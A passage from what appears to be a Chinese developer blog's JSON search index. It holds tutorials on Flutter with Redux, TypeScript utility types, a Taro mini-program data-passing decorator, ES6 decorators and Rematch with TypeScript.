'../index.dart' show createCommit;Function commit = createCommit('index');// stateclass IndexState &#123; IndexState(&#123;this.count&#125;); int count = 0; @override String toString() &#123; return 'index: $count'; &#125;&#125;// actionclass IndexAction &#123; static void add(count) &#123; commit((state) &#123; state.count += count; return state; &#125;); &#125;&#125; createCommit 是一个封装了 dispatch 的创建操作函数。看下面的实现。commit 就是一个利用了闭包结构实现的数据改变函数，这样做就是为少写几行代码。 一系列操作函数12345678910111213141516171819202122232425import 'package:redux/redux.dart';// ... 此处省略一堆代码Store&lt;IState&gt; _store = _createStore();// 返回 storeStore&lt;IState&gt; getStore() &#123; return _store;&#125;// 返回 stateIState getState() &#123; return _store.state;&#125;// 创建 commit 的函数Function createCommit(String type) &#123; return (Function callback) &#123; _store.dispatch(&#123; 'type': type, 'callback': callback, &#125;); &#125;;&#125; 在 createCommit 里实际上就是对 dispatch 进行了一层封装，执行之后返回一个调用函数，这个函数有一个回调，就是用来改变数据的回调。 而 action.type 在创建时就指定了（这里利用了闭包），使用 commit 起来就显得非常简单。 1234567891011Function commit = createCommit('index');// actionclass IndexAction &#123; static void add(count) &#123; commit((state) &#123; state.count += count; return state; &#125;); &#125;&#125; 适配 reducer既然 action 改变了，因此 reducer 也要做一些适配，主要是 callback 里要注入 state 和接收新的 state。 123456789101112131415// 定义 reducerIState rootReducer(IState state, dynamic action) &#123; var type = action['type']; var callback = action['callback']; if (type == 'index') &#123; state.index = callback(state.index); &#125; if (type == 'other') &#123; state.other = callback(state.other); &#125; log('state', state); return state;&#125; 组件里调用 action这样一来在组件里就不要依赖 store 的上下文执行 dispatch 了。直接调用 model 的 Action 类的静态方法。 12345678910import 'stores/models/index.dart' show IndexAction;import 'stores/models/other.dart' show OtherAction;floatingActionButton: FloatingActionButton( child: Icon(Icons.add), onPressed: () &#123; IndexAction.add(10); OtherAction.add(); &#125;,), 小结对 redux 的结构，代码进行封装之后，只是 action 与 state 方面的操作好多了。 对于结构比较复杂的 state，自己手写 State 类是比较辛苦的，这样是有一些工具可以把 json 转换成 dart 的类的，可以试一下quicktype，支持 js、typescript、dart 等多种语言，可以一键的将定义好的 json 结构转换成数据类。","categories":[{"name":"Flutter","slug":"Flutter","permalink":"http://me.lizhooh.com/categories/Flutter/"}],"tags":[{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/tags/Redux/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"Flutter","slug":"Flutter","permalink":"http://me.lizhooh.com/tags/Flutter/"},{"name":"Dart","slug":"Dart","permalink":"http://me.lizhooh.com/tags/Dart/"}]},{"title":"Flutter + Redux 使用指南","slug":"Flutter/Flutter + Redux 使用指南","date":"2019-06-22T03:26:31.000Z","updated":"2021-06-15T06:10:52.816Z","comments":true,"path":"/stories/2019/06/Flutter/Flutter + Redux 使用指南/","link":"","permalink":"http://me.lizhooh.com/stories/2019/06/Flutter/Flutter + Redux 使用指南/","excerpt":"前言Redux 是一个可预测 Javascript 状态容器框架，用于前端数据流管理。因为其设计哲学非常先进，因此，在 Flutter 里也可以使用 Redux。在 Flutter 是使用 dart 实现的 Redux 版本。 本文就不讲什么是 redux，为什么用 redux 这些话题了，就讲这么在 flutter 里使用 redux。","text":"前言Redux 是一个可预测 Javascript 状态容器框架，用于前端数据流管理。因为其设计哲学非常先进，因此，在 Flutter 里也可以使用 Redux。在 Flutter 是使用 dart 实现的 Redux 版本。 本文就不讲什么是 redux，为什么用 redux 这些话题了，就讲这么在 flutter 里使用 redux。 安装在 Flutter 里使用 Redux 需要使用到 redux 和 flutter_redux 两个包。在 pubspec.yaml 里的 dependencies 添加依赖： 123456dependencies: flutter: sdk: flutter redux: ^3.0.0 flutter_redux: ^0.5.2 开始使用 redux在 flutter 里使用 redux，跟在 react 里使用 redux 差不多，为 7 步曲： 定义 Action Types 枚举。 定义 State 类。 创建 Root Reduers。 创建 Store。 将 Store 连接到根的节点。 将 State 连接到组件。 使用 dispatch 触发 action。 创建 Action Types创建 Action Types 用于 dispatch 调用时指定数据的改变方式。 12345// 定义 action typesenum Types &#123; Add1, Add2,&#125; 定义 State 类12345678910111213141516171819202122232425262728293031323334// index modelclass Index &#123; Index(&#123;this.count&#125;); int count = 0; @override String toString() &#123; return 'index: $count'; &#125;&#125;// other modelclass Other &#123; Other(&#123;this.count&#125;); int count = 0; @override String toString() &#123; return 'other: $count'; &#125;&#125;// 定义 root stateclass IState &#123; IState(&#123;this.index, this.other&#125;); Index index; Other other; @override String toString() &#123; return '&#123; $index, $other &#125;'; &#125;&#125; 创建 Root Reduers由于 flutter redux 不能进行 reduers 切片，reduers 只能用一个 reduers 了。 1234567891011121314// 定义 reducer// action =&gt; &#123; 'type': xxx, payload: 'xxx' &#125;IState rootReducer(IState state, dynamic action) &#123; if (action['type'] == Types.Add1) &#123; state.index.count += action['payload']; &#125; if (action['type'] == Types.Add2) &#123; state.other.count += 2; &#125; log('state', state); return state;&#125; 特别不同的是，在 flutter 里不需要返回新的 state 对象（说好的数据不可变呢？）。 创建 Store创建 Store 里需要指定泛型的类型。 1234567891011121314151617181920212223import 'package:redux/redux.dart';// 中间件logger(Store&lt;IState&gt; store, action, NextDispatcher next) &#123; print('$&#123;new DateTime.now()&#125;: $action'); next(action);&#125;// Store 是从 redux.dart 里来的// 初始化 storeStore&lt;IState&gt; createStore() &#123; Store&lt;IState&gt; store = new Store&lt;IState&gt;( rootReducer, initialState: new IState( index: new Index(count: 0), other: new Other(count: 0), ), middleware: [logger] ); return store;&#125; 将 Store 连接到根的节点12345678910111213141516171819202122// 放到全局里Store&lt;IState&gt; store = createStore();void main() &#123; // 顶级节点 runApp(new MyApp(store: store));&#125;class MyApp extends StatelessWidget &#123; MyApp(&#123;Key key, this.store&#125;); final Store&lt;IState&gt; store; @override Widget build(BuildContext context) &#123; // provider 联系上下文的一个函数 return new StoreProvider( store: store, child: MaterialApp(home: home), ); &#125;&#125; 将 State 连接到组件连接组件时也是需要指定泛型的类型。 1234567891011121314151617var home = StoreConnector&lt;IState, dynamic&gt;( // 数据转换，相当于 connect(state =&gt; state.count); converter: (Store&lt;IState&gt; store) &#123; return &#123; 'count1': store.state.index.count, 'count2': store.state.other.count, &#125;; // converter 的返回类型是受 StoreConnector 第二个类型而定的。 // 并且 builder: (BuildContext context, int counter) 的第二个参数类型与一致。 &#125;, builder: (BuildContext context, dynamic data) &#123; return HomePage( count1: data['count1'], // 这里就是将 state 注入组件的 props 里 count2: data['count2'], ); &#125;,); 使用 dispatch 触发 action1234567891011121314151617181920212223242526272829303132333435class HomePage extends StatelessWidget &#123; HomePage(&#123;Key key, this.count1, this.count2&#125;); final int count1; final int count2; @override Widget build(BuildContext context) &#123; return Scaffold( appBar: AppBar( title: Text('Redux'), ), body: Center( child: Column( mainAxisAlignment: MainAxisAlignment.center, // 来自 store 的数据 children: &lt;Widget&gt;[ Text('Count1：'), Text('$count1', style: TextStyle(fontSize: 32)), Text('Count2：'), Text('$count2', style: TextStyle(fontSize: 32)), ], ), ), floatingActionButton: FloatingActionButton( child: Icon(Icons.add), onPressed: () &#123; // 这里触发 action store.dispatch(&#123;'type': Types.Add1, 'payload': 5&#125;); store.dispatch(&#123;'type': Types.Add2&#125;); &#125;, ), ); &#125;&#125; 触发 action 需要调用 dispatch，dispatch 在 store 里获取。如果 store 是全局变量那就好办，否则只能通过 StoreConnector 提供 store 上下文，代码很比较挫，累赘。 1234567891011121314151617floatingActionButton: StoreConnector&lt;IState, VoidCallback&gt;( converter: (Store&lt;int&gt; store) &#123; return () &#123; store.dispatch(&#123;'type': Types.Add1, 'payload': 5&#125;); store.dispatch(&#123;'type': Types.Add2&#125;); &#125;; &#125;, builder: ( BuildContext context, VoidCallback callback, ) =&gt; FloatingActionButton( // 这里需要调用哪个啥（兜了这么大一个圈啊） onPressed: callback, child: Icon(Icons.add), ),), 小结 在 flutter 里使用 redux 和在 react 里差不多。 store 最好设计成全局的变量，这样就不需要使用 StoreConnector 获取 store 的上下文来执行 dispatch。 使用了 redux 之后 flutter 的热加载会失效，所以改了 redux 相关的代码需要重启一下，这是一个 BUG。 由于 dart 强类型的原因，并且没有像 Typescript 的类型别名关键字，因此，需要把 IState 公开到各个页面组件里。 reducer 没有提供切片功能，不知性能方面会怎样。 下篇文章，讲一下如何封装整个 store 代码，让其更加具有可用性。请留意：续集。","categories":[{"name":"Flutter","slug":"Flutter","permalink":"http://me.lizhooh.com/categories/Flutter/"}],"tags":[{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/tags/Redux/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"Flutter","slug":"Flutter","permalink":"http://me.lizhooh.com/tags/Flutter/"},{"name":"Dart","slug":"Dart","permalink":"http://me.lizhooh.com/tags/Dart/"}]},{"title":"Typescript 类型约束黑魔法","slug":"Typescript/Typescript 类型约束黑魔法","date":"2019-06-19T07:59:00.000Z","updated":"2021-06-15T06:10:52.897Z","comments":true,"path":"/stories/2019/06/Typescript/Typescript 类型约束黑魔法/","link":"","permalink":"http://me.lizhooh.com/stories/2019/06/Typescript/Typescript 类型约束黑魔法/","excerpt":"前言在 Typescript 里有很多类型推断，类型约束的黑魔法，下面来看看。这些类型大部分都可以直接使用不用定义，在 lib.es5.d.ts 里有定义。","text":"前言在 Typescript 里有很多类型推断，类型约束的黑魔法，下面来看看。这些类型大部分都可以直接使用不用定义，在 lib.es5.d.ts 里有定义。 Extends 继承将 A 类型继承于 B 类型： 123456type Extends&lt;T, U&gt; = T extends U;// 示例type Base1 = &#123; name: string &#125;;type Base2 = &#123; age: number &#125;;type User = Extends&lt;Base1, Base2&gt;; Readonly 只读将某个类型的所有类型都设置为只读。 1234567type Readonly&lt;T&gt; = &#123; readonly [P in keyof T]: T[P] &#125;;// 示例type User = &#123; name: string &#125;;type A = Readonly&lt;User&gt;;// =&gt; &#123; readonly name: string &#125; IsType 判断类型判断某个对象是否是这个类型。 12345type IsType&lt;T&gt; = (val: any) =&gt; val is T;// 示例export const isObj: IsType&lt;object&gt;;export const isNumber: IsType&lt;number&gt;; keyof 约束于键值123456const obj = &#123; name: 'abc', id: 123,&#125;;const key: keyof typeof obj = 'id'; 更高级的用法： 123456789interface Data &#123; title: string, role: 'user' | 'admin', id: string | number,&#125;function set&lt;K extends keyof Data&gt;(key: K, value: Data[K]) &#123; // ...&#125; 说明： K 是继承至 keyof Data 的，也就是 K 的取值只能是 title，role，id。 value 是根据 Data[k] 的类型的。 Partial 类型设置为可选将指定类的的属性都设置为可选。 123456789type Partial&lt;T&gt; = &#123; [P in keyof T]?: T[P] &#125;;// 示例interface Data &#123; title: string,&#125;type NewData = Partial&lt;Data&gt;;// =&gt; &#123; title?: string &#125; Required 类型设置为必选是 Partial 的相反操作。 123456789type Required&lt;T&gt; = &#123; [P in keyof T]-?: T[P] &#125;;// 示例interface Data &#123; title?: string,&#125;type NewData = Required&lt;Data&gt;;// =&gt; &#123; title: string &#125; Extract 是否有继承Extract 是用于判断是否有继承的。获取有继承关系的。 12345type Extract&lt;T, U&gt; = T extends U ? T : never;// 示例type A = Extract&lt;string | number | (() =&gt; void), Function&gt;;// =&gt; () =&gt; void 说明： Extract 是用于判断是否有继承的，因此 () =&gt; void 是一个函数。 Exclude 是否没有继承与 Extract 是相反操作。获取没有继承关系的。 12345type Exclude&lt;T, U&gt; = T extends U ? never : T;// 示例type A = Exclude&lt;string | number | (() =&gt; void), Function&gt;;// =&gt; string | number Expand 展开Expand 可以将一个数组按照类型展开。（需要 typescript 3.5+） 12345const list = ['A', 'B', 'C', 'D'] as const;type S = Pick&lt;typeof list, any&gt;;type SS = S[keyof S];SS =&gt; 'A' | 'B' | 'C' | 'D'; 另外还有方法： 12const list = ['A', 'B', 'C', 'D'] as const;type P = (typeof list)[number]; Unify 类型统一Unify 可以让所有的对象键值类型统一为同一个类型。 12345type Unify&lt;T, S&gt; = &#123; [P in keyof T]: S &#125;type Obj = Unify&lt;&#123; name, title &#125;, string&gt;;Obj =&gt; &#123; name: string, title: string &#125;; Merge 类型合并将两个类型进行合并。 1export type Merge&lt;T, U&gt; = T &amp; U; Omit 移除某个类型属性1234567891011type Omit&lt;T, K extends keyof T&gt; = Pick&lt;T, Exclude&lt;keyof T, K&gt;&gt;;// 示例interface Data &#123; title: string, role: 'user' | 'admin', id: string | number,&#125;type NewData = Omit&lt;Data, 'title'&gt;// =&gt; &#123; role, id &#125; Pick 取某个类型是 Omit 的相反操作。 1234567891011type Pick&lt;T, K extends keyof T&gt; = &#123; [P in K]: T[P] &#125;;// 示例interface Data &#123; title: string, role: 'user' | 'admin', id: string | number,&#125;type NewData = Pick&lt;Data, 'title'&gt;// =&gt; &#123; title: string &#125; Pickkey 根据将对象的属性进行推断比如有一个嵌套对象，想获取 value 的值。 1234567891011121314151617181920const f = &#123; name: &#123; title: '名称', value: 'aab', &#125;, explains: &#123; title: '功能说明', value: ['abc'], &#125;, status: &#123; title: '发布状态', value: false, &#125;,&#125;;type F = typeof f;type Pickkey = &#123; [key in keyof F]: (F)[key]['value']&#125;; Record 将枚举变为对象类型123456type Record&lt;K extends keyof any, T&gt; = &#123; [P in K]: T &#125;;// 示例type Role = 'user' | 'admin';type NewRole = Record&lt;Role, string&gt;;// =&gt; &#123; user: string; admin: string &#125; ReturnType 获取某个函数的返回类型获取某个变量的类型，可以使用 typeof，但是函数却不行，得这样做。 12345678910export type ReturnType&lt;T extends (...args: any[]) =&gt; any&gt; = T extends ( ...args: any[]) =&gt; infer R ? R : any;// 示例type T10 = ReturnType&lt;() =&gt; string&gt;; // stringtype T11 = ReturnType&lt;(s: string) =&gt; void&gt;; // voidtype T12 = ReturnType&lt;(&lt;T&gt;() =&gt; T)&gt;; // &#123;&#125;type T13 = ReturnType&lt;(&lt;T extends U, U extends number[]&gt;() =&gt; T)&gt;; // number[]type T14 = ReturnType&lt;typeof f1&gt;; // &#123; a: number, b: string &#125; NonNullable 过滤非空的类型12345type NonNullable&lt;T&gt; = T extends null | undefined ? never : T;// 示例type A = NonNullable&lt;(() =&gt; string) | string[] | null | undefined&gt;;// =&gt; () =&gt; string | string[] Parameters 获取函数的参数类型获取函数的参数类型，得到的是元组。 123456type Parameters&lt;T extends (...args: any[]) =&gt; any&gt; = T extends (...args: infer P) =&gt; any ? P : never;// 示例function hello(name: string, age: number) &#123;&#125;type A = Parameters&lt;typeof hello&gt;;// =&gt; [string, number] InstanceType 获取构造函数的返回类型1type InstanceType&lt;T extends new (...args: any[]) =&gt; any&gt; = T extends new (...args: any[]) =&gt; infer R ? R : any; 小结一般只有写框架或库的时候才会，使用这么多的黑魔法。","categories":[{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/categories/Typescript/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/tags/Typescript/"}]},{"title":"Taro 小程序页面数据回传解决方案（装饰器）","slug":"小程序/Taro 小程序页面数据回传解决方案（装饰器）","date":"2019-06-08T08:14:26.000Z","updated":"2021-06-15T06:10:52.912Z","comments":true,"path":"/stories/2019/06/小程序/Taro 小程序页面数据回传解决方案（装饰器）/","link":"","permalink":"http://me.lizhooh.com/stories/2019/06/小程序/Taro 小程序页面数据回传解决方案（装饰器）/","excerpt":"前言小程序比较坑爹的是很多东西不能动态的生成，例如官方提供的 Tabs 不能动态生成。还有其他的坑，比如页面之间传值通过 url 参数的方向进行，因此导致了页面回退的时候不能把数据回传到父页面。在很多业务场景里都需要不同页面之间的数据传递，在 Android 里通过 Intent 可以进行数据回传，在小程序里官方没有提供相关接口，而是需要一种比较“屌丝”的方式去实现它。","text":"前言小程序比较坑爹的是很多东西不能动态的生成，例如官方提供的 Tabs 不能动态生成。还有其他的坑，比如页面之间传值通过 url 参数的方向进行，因此导致了页面回退的时候不能把数据回传到父页面。在很多业务场景里都需要不同页面之间的数据传递，在 Android 里通过 Intent 可以进行数据回传，在小程序里官方没有提供相关接口，而是需要一种比较“屌丝”的方式去实现它。 术语： 源页面：从 A 页面打开 B 页面，那么 A 就是源页面。 本页面：从 A 页面打开 B 页面，那么 B 就是本页面。 回传数据：关闭 B 页面时，将数据传递给 A 页面。 实现方式实现的方式是获取整个路由栈的队列，然后从队列里找出上一个页面的实例对象，然后调用实例对象的方法来更新数据。 下面是原生的写法： 1234const pages = getCurrentPages();const page = pages[pages.length - 1];const info = page.data;page.setData(&#123; key: 'value' &#125;); 不想说些什么了，这样内存占用能少吗。 下面是 Taro 的写法： 1234const nativePages = Taro.getCurrentPages();const page = pages[pages.length - 1];const info = page.$component.state;page.$component.setState(&#123; key: 'value' &#125;); 唯一不同的是在 Taro 里，Taro 组件实例是挂载在 $component 里。需要通过调用 $component.setState 来更新数据。 装饰器上面的代码在两个页面之间编写是很多简单，但是有时候源页面的路径并不上上一个，并且在其他页面里更新源页面的数据，从设计上来说有点不可控，因此我们通过封装成装饰器来减少模版代码以及提供可维护性。 大致的思路： 在路由参数里提供两个值：sourcePath 和 updateFuncName，用于查找源页面，和执行更新源页面的函数名，而不是这么暴力的使用 setState，并且 updateFuncName 的逻辑是写在源页面上的。 在装饰器参数里提供 injectFuncName，用于指明在本页面执行回传数据的函数名，函数的逻辑在装饰器里实现，回传的数据在参数里提供。 具体实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import &#123; getCurrentPages &#125; from '@tarojs/taro';/** * 用于页面之间数据回传的装饰器 * 源页面要在路由里提供两个参数：sourcePath, updateFuncName * * router.push(path, &#123; sourcePath: path, updateFuncName: 'updateData' &#125;) * * @param&#123;String&#125; key - debug 标识 * @param&#123;String&#125; injectFuncName 注入本页面实例的数据回传执行函数名，默认为 dataRransfer*/export default (key: string, injectFuncName: string = 'dataRransfer') =&gt; target =&gt; &#123; target.prototype[injectFuncName] = function (data: any): Promise&lt;any&gt; &#123; const nativePages = getCurrentPages(); // 来源路径，执行数据更新的函数名，updateFuncName(data) let &#123; sourcePath, updateFuncName &#125; = this.$router.params; if (!('sourcePath' in this.$router.params) || !('updateFuncName' in this.$router.params)) &#123; console.warn(`[$&#123;key&#125;]`, '来源页为提供路由参数对象的属性：sourcePath 和 updateFuncName'); return Promise.reject(0); &#125; if (sourcePath &amp;&amp; sourcePath[0] === '/') &#123; sourcePath = sourcePath.slice(1); &#125; if (!sourcePath) &#123; console.warn(`[$&#123;key&#125;]`, '来源页的 sourcePath 为空'); return Promise.reject(-1); &#125; let page = null; for (let i = nativePages.length - 1; i &gt;= 0; i--) &#123; if (nativePages[i].route === sourcePath) &#123; page = nativePages[i]; &#125; &#125; if (!page) &#123; console.warn(`[$&#123;key&#125;]`, '找不到来源页实例对象'); return Promise.reject(-2); &#125; if (!page.$component[updateFuncName]) &#123; console.warn(`[$&#123;key&#125;]`, '来源页实例不存在方法：' + updateFuncName); return Promise.reject(-3); &#125; return new Promise((resolve, reject) =&gt; &#123; try &#123; resolve(page.$component[updateFuncName](data, key)); &#125; catch (err) &#123; reject(err); &#125; &#125;); &#125;;&#125; 使用方式： 1234567891011121314151617181920212223242526class A extends Component &#123; // 回传数据执行的函数 updateData = (data, key) =&gt; &#123; this.setState(&#123; name: data &#125;); &#125; openBPage = () =&gt; &#123; // 打开一个新的页面，并且把 sourcePath 和 updateFuncName 指定传递过去 router.push('pages/B', &#123; sourcePath: 'pages/A', updateFuncName: 'updateData', &#125;); &#125;&#125;// 注入装饰器@PageDataRransfer('B')class B extends Component &#123; // 装饰了之后，有会 dataRransfer 函数 // dataRransfer 用于触发数据的回传 // 使用之后相当于触发 updateFuncName 指定的函数 onSubmit = _ =&gt; &#123; const data = &#123; name: 'hello !!' &#125;; this['dataRransfer'](data); &#125;&#125; 好，一个比较好的封装，解决了小程序数据回传的问题，以及代码很挫的问题，提高了整体的可维护性。 参考资料 https://developers.weixin.qq.com","categories":[{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/categories/小程序/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/tags/小程序/"}]},{"title":"ES6 装饰器（decorator）","slug":"ECMAScript/ES6 装饰器（decorator）","date":"2019-05-26T16:32:25.000Z","updated":"2021-06-15T06:10:52.811Z","comments":true,"path":"/stories/2019/05/ECMAScript/ES6 装饰器（decorator）/","link":"","permalink":"http://me.lizhooh.com/stories/2019/05/ECMAScript/ES6 装饰器（decorator）/","excerpt":"前言装饰器是 ECMAScript 里添加的提案，现在还是处于不稳定的状态。许多面向对象的语言都有修饰器（Decorator）函数，用来修改类的行为。 装饰类12345678910function Test(target: any) &#123; target.isTestable = true;&#125;@Testclass MyClass &#123; // ...&#125;MyClass.isTestable; // true","text":"前言装饰器是 ECMAScript 里添加的提案，现在还是处于不稳定的状态。许多面向对象的语言都有修饰器（Decorator）函数，用来修改类的行为。 装饰类12345678910function Test(target: any) &#123; target.isTestable = true;&#125;@Testclass MyClass &#123; // ...&#125;MyClass.isTestable; // true 上面代码中，@Test 就是一个装饰器。它修改了 MyClass 这 个类的行为，为它加上了静态属性 isTestable。Test 函数的参数 target 是 MyClass 类本身。 装饰器是一个对类进行处理的函数。装饰器函数的第一个参数，就是所要装饰的目标类。 装饰器对类的行为的改变，是代码编译时发生的，而不是在运行时。 装饰类方法固定模式： 12345678910111213141516function Hello(target: any, key: string, descriptor: any) &#123; const oldValue = descriptor.value; descriptor.value = function (...arg) &#123; const val = oldValue.apply(this, arg); console.log(`调用函数：$&#123;name&#125;，参数为：$&#123;arg&#125;，结果为：$&#123;val&#125;`); return val; &#125;; return descriptor;&#125;class A &#123; @Hello say() &#123; &#125;&#125; 说明： target 是类的本身，并不是实例化后的对象哦。 key 是方法的名称。 descriptor 是一个方法的描述对象。 123456&#123; enumerable: true, configurable: true, get: function () &#123; &#125;, set: function (c) &#123; &#125;,&#125; 目前发现，类的方法装饰不能用在类的箭头函数上。 装饰类属性固定模式： 123456789101112131415function Hello(target: any, key: string) &#123; let val = target[key]; Object.defineProperty(target, key, &#123; get: function() &#123; return val; &#125;, set: function(newVal) &#123; val = newVal; &#125;, &#125;);&#125;class A &#123; @Hello name =' abc'&#125; 说明： target 是类的本身，并不是实例化后的对象哦。 key 是属性的名称。 装饰类参数固定模式： 12345678910111213function logParameter(target: any, key: string, index: number) &#123; if (Array.isArray(target[key])) &#123; target[key].push(index); &#125; else &#123; target[key] = [index]; &#125;&#125;class A &#123; say(@Hello name: string) &#123; &#125;&#125; 说明 参数装饰器可以装饰在类方法的参数上。 target 是类的本身，并不是实例化后的对象哦。 key 是方法的名称。 index 是参数的位置。 应用场景React 生命周期函数页面初始化装饰，在使用 React 经常会在 componentDidMount 进行请求 api 数据。 12345export default class Index extends Component &#123; componentDidMount() &#123; action.init(); &#125;&#125; 写一个装饰器实现在 componentDidMount 里拉取数据。 12345678910111213const InitDate = func =&gt; target =&gt; &#123; const componentDidMount = target.prototype.componentDidMount; target.prototype.componentDidMount = () =&gt; &#123; if (componentDidMount) componentDidMount(); func(); &#125;; return target;&#125;;@InitDate(action.init)export default class Index extends Component &#123;&#125; 同样的这种方式可以推广的更多的生命周期函数，例如在 componentDidCatch 里进行错误捕捉等。 React 性能优化编写一个装饰器，实现在 React shouldComponentUpdate 里进行性能优化，指定优化的字段。 12345678910111213141516171819202122232425262728/** * 渲染优化 * @param&#123;String|Array&#125; key - props key*/const RenderOptimization = (key: string | string[]) =&gt; (target): void =&gt; &#123; const scu = target.prototype.shouldComponentUpdate || (_ =&gt; true); target.prototype.shouldComponentUpdate = function (nextProps, nextState) &#123; let flag = true; if (Array.isArray(key)) &#123; for (let i = 0; i &lt; key.length; i++) &#123; flag = flag &amp;&amp; (this.props[key[i]] === nextProps[key[i]]); &#125; &#125; else &#123; flag = this.props[key] !== nextProps[key]; &#125; return flag &amp;&amp; scu(nextProps, nextState); &#125;;&#125;;// 在 props id 改变时才渲染@RenderOptimization('id')export default class Index extends Component &#123;&#125; 日志输出对于某个函数，我们希望能够在运行完成后输出日志，这时可以使用日志装饰。 123456789101112131415161718const Log = name =&gt; (target, name, descriptor) =&gt; &#123; const oldValue = descriptor.value; descriptor.value = function (...arg) &#123; const val = oldValue.apply(this, arg); console.log(`调用函数：$&#123;name&#125;，参数为：$&#123;arg&#125;，结果为：$&#123;val&#125;`); return val; &#125;; return descriptor;&#125;;export default class Index extends Component &#123; @Log('add') add(state, payload) &#123; return state.count + payload; &#125;&#125; 异步函数装饰对异步函数进行装饰实现，一些 loading 显示效果。例如在 React 里会有很大的 onSubmit 提交，可以在提交之后显示 loading，提交成功后移除 loading。 1234567891011121314151617181920const LoadingWrap = prefix =&gt; (target, name, descriptor) &#123; const oldValue = descriptor.value; descriptor.value = function (...arg) &#123; Toast.info(`$&#123;prefix&#125;中`); const val = oldValue.apply(this, arg); Toast.success(`$&#123;prefix&#125;$&#123;val ? '成功' : '失败'&#125;`); return val; &#125;; return descriptor;&#125;;export default class Index extends Component &#123; @LoadingWrap('提交') onSubmit = e =&gt; &#123; return true; // 根据返回 true/false 来断定 &#125;&#125; 数据格式转换利用属性装饰，实现时间的格式化。 1234567891011121314151617181920212223242526const TimeFormat = (format: string, p: string) =&gt; (target, key) =&gt; &#123; let val = target[key]; function getter() &#123; if (typeof val === 'object') &#123; val[p] = dayjs(val[p]).format(format); &#125; return val; &#125; function setter(newVal) &#123; val = newVal; &#125; Object.defineProperty(target, key, &#123; get: getter, set: setter, &#125;);&#125;;export default class Index extends Component &#123; @TimeFormat('YYYY-MM-DD', 'time') state = &#123; time: '2019-05-27 00:36:52' // =&gt; 2019-05-27 &#125;&#125; 小结装饰器发生在编译阶段而不是运行阶段，所以一些运行时的数据是获取不到的。装饰能够装饰类，类的方法，类的属性，类方法的参数。 方法装饰器的核心是方法描述符。 属性装饰器的核心是 Object.defineProperty。 Class 装饰器的核心是构造函数。 参数装饰器的主要作用是标记，要结合方法装饰器来使用。","categories":[{"name":"ES6","slug":"ES6","permalink":"http://me.lizhooh.com/categories/ES6/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"ES6(ES2015)","slug":"ES6-ES2015","permalink":"http://me.lizhooh.com/tags/ES6-ES2015/"}]},{"title":"Rematch Typescript 使用指南","slug":"Redux/Rematch Typescript 使用指南","date":"2019-05-26T09:32:10.000Z","updated":"2021-06-15T06:10:52.892Z","comments":true,"path":"/stories/2019/05/Redux/Rematch Typescript 使用指南/","link":"","permalink":"http://me.lizhooh.com/stories/2019/05/Redux/Rematch Typescript 使用指南/","excerpt":"前言Rematch 是一个基于 Redux 的框架，主要是为了简化 Redux 的编程。之前写过文章介绍它（Rematch 的使用指南），这里就不重复介绍了。 在 Rematch 里支持 Typescript，但是 Redux 需要在 4.0 版本以上。Rematch 使用分为几步：1. 创建 store，2. 编写 modal，3. 连接 React 组件。","text":"前言Rematch 是一个基于 Redux 的框架，主要是为了简化 Redux 的编程。之前写过文章介绍它（Rematch 的使用指南），这里就不重复介绍了。 在 Rematch 里支持 Typescript，但是 Redux 需要在 4.0 版本以上。Rematch 使用分为几步：1. 创建 store，2. 编写 modal，3. 连接 React 组件。 创建 Store1234567891011121314151617import &#123; init, RematchRootState &#125; from '@rematch/core';import index from './models/index';const models = &#123; index,&#125;;const store = init(&#123; models,&#125;);export type IStore = typeof store;export type IDispatch = typeof store.dispatch;export type IRootState = RematchRootState&lt;typeof models&gt;;export default store; 编写 modal123456789101112131415161718192021222324import &#123; createModel &#125; from '@rematch/core';export interface IState &#123; count: number,&#125;export const state: IState = &#123; count: 0,&#125;;export default createModel(&#123; state, reducers: &#123; add(state: IState, payload) &#123; state.count = state.count + payload; &#125; &#125;, effects: &#123; asyncAdd: async (n) =&gt; &#123; await new Promise(rs =&gt; setTimeout(rs, 1000)); this.add(n); &#125; &#125;,&#125;); 连接 React 组件使用 connect 连接组件，并注入 props 的类型。 12345678910111213141516171819202122232425262728293031import React, &#123; Component &#125; from 'react';import &#123; View, Text, Button &#125; from 'react-native';import &#123; connect &#125; from 'react-redux';import &#123; IRootState, IDispatch &#125; from '@/stores';@connect( (state: IRootState) =&gt; (&#123; state: state.index &#125;), (action: IDispatch) =&gt; (&#123; action: action.index &#125;),)export default class Index extends Component&lt;&#123; state: IRootState['index'], action: IDispatch['index'],&#125;&gt; &#123; state = &#123; time: '2019-05-27 09:18:29' &#125; render() &#123; const &#123; time &#125; = this.state; const &#123; count &#125; = this.props.state; const &#123; asyncAdd &#125; = this.props.action; return ( &lt;View&gt; &lt;Text&gt;&#123;count&#125; - &#123;time&#125;&lt;/Text&gt; &lt;Button onClick=&#123;asyncAdd.bind(this, 1)&#125;&gt;加一&lt;/Button&gt; &lt;/View&gt; ); &#125;&#125; 好本篇文章结束。 参考资料 